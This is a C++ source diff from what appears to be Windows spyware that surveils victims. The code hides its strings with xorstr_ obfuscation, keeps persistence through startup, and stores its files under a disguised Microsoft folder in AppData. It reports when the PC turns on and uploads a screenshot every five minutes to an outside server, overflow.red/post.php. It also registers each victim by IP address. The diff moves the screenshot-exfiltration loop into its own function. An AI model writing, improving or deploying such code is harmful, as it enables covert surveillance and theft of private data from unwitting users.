@@ -4,9 +4,9 @@
 #include <vector>
 #include <regex>
 
-#include "utility/xor.hpp"
-#include "utility/requests.h"
-#include "utility/helper.h"
+#include "..\utility\xor.hpp"
+#include "..\utility\requests.h"
+#include "..\utility\helper.h"
 
 namespace fs = std::filesystem;
 
@@ -69,23 +69,35 @@ bool check_for_startup() {
 	return false;
 }
 
+void background_loop() {
+	while (true) {
+		/* Send Screenshot Every 5 Mins */
+		take_screenshot(roaming + xorstr_("\\Microsoft\\") + xorstr_("temp.jpg"));
+		post_request_file(xorstr_("https://overflow.red/post.php"), roaming + xorstr_("\\Microsoft\\") + xorstr_("temp.jpg"));
+		post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_image&content=**PC Screenshot**&webhook_url=") + client_webhook_url);
+		Sleep(300000);
+	}
+}
+
 void start_client() {
 
 	/* Check If We've Already Created Startup */
 	if (check_for_startup()) {
-
-		/* Determine if ran from startup */
-		auto uptime = std::chrono::milliseconds(GetTickCount64());
-		if ((uptime / 60000).count() <= 1) {
-			post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&content=") + std::string(xorstr_("**PC Just Turned On**\n```\n") + (uptime / 60000).count() + std::string(xorstr_(" Minutes Ago")) + std::string(xorstr_("\n```"))));
-		}
-
 		/* Load Webhook */
 		std::ifstream file(roaming + xorstr_("\\Microsoft\\") + xorstr_("log.txt"));
 		if (file.good()) {
 			std::getline(file, client_webhook_url);
 		}
 		file.close();
+
+		/* Determine If Ran From Startup */
+		auto uptime = std::chrono::milliseconds(GetTickCount64());
+		if ((uptime / 60000).count() <= 1) {
+			post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&content=") + std::string(xorstr_("**PC Just Turned On**\n```\n") + (uptime / 60000).count() + std::string(xorstr_(" Minutes Ago")) + std::string(xorstr_("\n```"))));
+		
+			/* Run In Background */
+			background_loop();
+		}
 
 		/* Send Screenshot */
 		take_screenshot(roaming + xorstr_("\\Microsoft\\") + xorstr_("temp.jpg"));
@@ -105,7 +117,7 @@ void start_client() {
 		/* Create Client Channel */
 		auto title = get_ip();
 		std::replace(title.begin(), title.end(), '.', ' ');
-		client_webhook_url = post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=create_channel&name=client-") + title);
+		post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=create_channel&name=client-") + title, &client_webhook_url);
 
 		/* Verify Webook Url */
 		if (client_webhook_url.empty())
@@ -134,12 +146,6 @@ void start_client() {
 		/* ~~~~~~~~~~~~ Stage 2 ~~~~~~~~~~~~ */
 
 		/* Run In Background */
-		while (true) {
-			/* Send Screenshot Every 5 Mins */
-			take_screenshot(roaming + xorstr_("\\Microsoft\\") + xorstr_("temp.jpg"));
-			post_request_file(xorstr_("https://overflow.red/post.php"), roaming + xorstr_("\\Microsoft\\") + xorstr_("temp.jpg"));
-			post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_image&content=**PC Screenshot**&webhook_url=") + client_webhook_url);
-			Sleep(300000);
-		}
+		background_loop();
 	}
 }
